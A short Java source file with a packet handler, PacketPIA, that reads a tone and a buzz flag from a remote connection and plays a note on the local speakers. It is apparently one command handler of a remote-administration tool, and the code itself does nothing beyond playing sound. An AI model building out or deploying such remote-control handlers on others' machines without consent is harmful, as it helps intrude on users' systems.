package com.redpois0n.packets;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.SourceDataLine;

import com.redpois0n.Connection;
import com.redpois0n.Note;


public class PacketPIA extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		int tone = Integer.parseInt(Connection.readLine());
		boolean buzz = Boolean.parseBoolean(Connection.readLine());
		AudioFormat af = new AudioFormat(Note.SAMPLE_RATE, 8, 1, true, true);
		SourceDataLine dl = AudioSystem.getSourceDataLine(af);
		dl.open(af, Note.SAMPLE_RATE);
		dl.start();
		Note.play(dl, Note.values()[tone], 500);

		if (buzz) {
			Note.play(dl, Note.REST, 500);
		}
		dl.drain();
		dl.close();
	}

}
